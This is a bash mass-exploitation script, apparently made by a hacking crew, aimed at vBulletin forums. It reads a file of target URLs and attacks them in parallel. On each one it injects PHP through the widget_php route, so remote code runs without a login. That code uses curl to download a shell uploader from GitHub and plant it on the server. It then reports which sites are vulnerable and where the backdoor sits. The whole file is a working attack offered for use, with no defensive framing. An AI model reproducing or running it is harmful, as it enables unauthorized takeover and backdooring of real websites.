#!/bin/bash
# auto exploit 
# zsecc0de-crew-id ~ widhisec
GREEN=$(tput setaf 2) #HIJAU
WHITE=$(tput setaf 7) #PUTIH
CYAN=$(tput setaf 6)
RED=$(tput setaf 1) #MERAH
NORMAL=$(tput sgr0)
LIMITATOR=15
function banner(){
	echo -e "
[===============================] 
 ___________
< vBulletin >
 -----------
 \     
  \            -> ${CYAN}(c) zsecc0de-crew-id
   \ >()_
      (__)__ _ $RED
[===============================]
	"
}
function Kerak(){
	en=$(echo $x | sed -f urlencode)
	chekweb=$(curl --silent "http://tools.seobook.com/server-header-checker/?url=$en&useragent=8&protocol=11" |  grep -c "HTTP/1.1 200 OK")
	}
function bababa(){
	Kerak;
	if [[ $chekweb =~ "1" ]]; then
        gassx=$(curl "$x" --request POST --data "routestring=ajax/render/widget_php&widgetConfig[code]=echo shell_exec('curl https://raw.githubusercontent.com/Avinash-acid/Shell-Uploader/master/uploader.php -o p3p3hxxeo.php');" --silent --output /dev/null -w "%{http_code}" -L)
            gase=$(curl --silent "$x" --data "routestring=ajax/render/widget_php&widgetConfig[code]=echo 'wiwi';" -L)
             grab=$(echo "$gase"| sed 's/\\r//g' | 
             sed 's/\\t//g' | 
                    sed 's/\\n//g' | 
                          sed 's/\\//g' | 
             grep -Po 'class="widget-header-divider" />\K.*?<' | 
                    tr -d '<')
          
     if [[ $grab =~ "wiwi" ]]; then
        	  printf "${WHITE}[${GREEN}VULN${GREEN}]${WHITE} ~ $x\n"	  
        	  echo -e "${WHITE}[${GREEN}MENCOBA UPLOAD..${GREEN}]${WHITE} ~"
     fi
           if [[ $gassx =~ "500" ]]; then
        	  printf "BERHASIL -> $x/p3p3hxxeo.php\n"
      else
        	  printf "${WHITE}[${RED}NOTT VULN]${WHITE} ~ $x\n"
        	fi
       fi
rm -rf nj Web
}
banner
echo -ne ${NORMAL}"list > "; read lst
if [[ ! -e $lst ]]; then
	printf "^file kosong .\n"
	exit 
fi
(
for x in $(cat ${lst}); do
	 ((thread=thread%LIMITATOR)); ((thread++==0)) && wait
     bababa &
done
wait
)